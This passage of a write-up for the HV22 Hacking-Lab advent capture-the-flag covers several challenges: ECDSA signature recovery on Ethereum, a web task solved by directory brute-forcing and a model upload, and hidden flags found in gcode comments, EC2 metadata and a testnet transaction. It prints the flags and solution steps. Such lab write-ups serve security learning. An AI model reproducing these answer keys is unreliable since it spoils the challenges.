`X` is not known at the beginning, but is strongly related to `r`. This is because `x = r + kn` for some integer `k`, where `x` is an element of the field `Fq` . In other words, `x < q`. ([source](https://coders-errand.com/ecrecover-signature-verification-ethereum/))

`q`: Constant defined by the curve (given).

Ethereum uses the curve **secp256k1** which defines:
```
q = 115792089237316195423570985008687907853269984665640564039457584007908834671663
n = 115792089237316195423570985008687907852837564279074904382605163141518161494337

y^2 = x^3 + 7
```

`v = 28` => recId = 1 (means `1 - y is odd, x is finite`, see [source](https://coders-errand.com/ecrecover-signature-verification-ethereum/)).

`sig = (r, s)` where `r` is the x coordinate of a random curve point `kG mod n`.
`s` depends on `r`.
Multiple coordinates map to the same `r`.


### Links
- Explanations on v, r & s values on ETH transactions: https://ethereum.stackexchange.com/questions/15766/what-does-v-r-s-in-eth-gettransactionbyhash-mean
- Derive the public key from the vrs triplet: https://ethereum.stackexchange.com/questions/13778/get-public-key-of-any-ethereum-account
- Mathematical and cryptographic functions: https://docs.soliditylang.org/en/v0.8.17/units-and-global-variables.html#mathematical-and-cryptographic-functions
- Web3.py's web3.eth API: https://web3py.readthedocs.io/en/latest/web3.eth.html
- Precompiled contracts: https://www.evm.codes/precompiled?fork=merge
- Ecrecover signature verification: https://coders-errand.com/ecrecover-signature-verification-ethereum/
- Ecrecover and ECDSA signature malleability: http://coders-errand.com/malleability-ecdsa-signatures/
- Inherent malleability of ECDSA signatures: https://www.derpturkey.com/inherent-malleability-of-ecdsa-signatures/

### Flag
```
HV22{H1dd3N_1n_V4n1Ty}
```
## [HV22.24] It's about time for some RSA

<table>
  <tr>
    <th>Categories</th>
    <td>Crypto, Reverse engineering</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>leet</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>LogicalOverflow</td>
  </tr>
</table>

### Description
Santa is giving autographs! And at the end of the signing session he'll also give out the flag! But better hurry; as Santa has lot's to do this time of year, he can only spent so much time to giving out autographs.

PS: Thanks to the latest in cloning technology, there are six Santas, so up to six signing session can take place at the same time!


### Solution
None. Did not solve.

### Flag
```
-
```
## [HV22.25] Santa's Prophesy

<table>
  <tr>
    <th>Categories</th>
    <td>Programming, Forensic, Web Security</td>
  </tr>
  <tr>
    <th>Level</th>
    <td>hard</td>
  </tr>
  <tr>
    <th>Author</th>
    <td>ShegaHL</td>
  </tr>
</table>

### Description
Based on an old fairytale from Kobeliaky, Santa can provide more than presents. He can show you the future!

### Solution
The following steps were executed to get the flag:
1. Navigate to page.
2. Extract data from jpeg image.
3. Find `/upload` page using `dirbuster` or `ffuf`.
4. Create a pytorch machine learing model in [solver.py](../dec25/dec25-solver.py)
5. Upload model and see flag.

```
HOHO, the model is showing fantastic results. You can have the cookie you deserve: HV22{AA21B6AB-4520-4AD2-8016-4A9F2C371E6E}
```

### Flag
```
HV22{AA21B6AB-4520-4AD2-8016-4A9F2C371E6E}
```
## [HV22.H1] Santa's Secret

In day 05's gcode file, there are a few commented lines.
```
;G1 X34.st3r E36 ;)
;G1 X72.86 Y50.50 E123.104
;G1 X49.100 Y100.51 E110.45
;G1 X102.108 Y52.103 E33,125
```

Isolating the decimal numbers from it:
```
72 86 50 50 123 104 49 100 100 51 110 45 102 108 52 103 33 125 
```

### Flag
```
HV22{h1dd3n-fl4g!}
```
## [HV22.H2] The Elves's Secret

### Description
Uhm...hello? What are you doing here? I thought you were tasked with finding a hidden flag in one of the medium challenges??

### Solution
Found in day 11.

This flag was found when listing the `tags` directory in the AWS EC2 metadata.

### Flag
```
HV22{5G0ldRing5QuickGetThem2MtDoom}
```
## [HV22.H3] Ruprecht's Secret


### Solution
Convert the flag from day 19 (`HV22{__N1c3__You__ARe__Ind33d__}`) to hex:
```
0x485632327b5f5f4e3163335f5f596f755f5f4152655f5f496e643333645f5f7d
```

Use it as a private key in Metamask to import an account (and generate a corresponding public key).

Copy the public key:
```
0x65cCa9C197f6cF1e38628E4dA7305D924466e4fc
```

Search for the public key on etherscan.io, blockscan.com, etc.

Find out that this public key was indeed used on the Goerli Testnet: https://blockscan.com/address/0x65cCa9C197f6cF1e38628E4dA7305D924466e4fc

See input data on the following transaction: https://goerli.etherscan.io/tx/0xb86d27740bec51d186353a5a9d472dcab6ca122becf129d8840c181f5d6de912


### Flag
```
HV22{W31hN4Cht5m4Nn_&C0._KG}
```
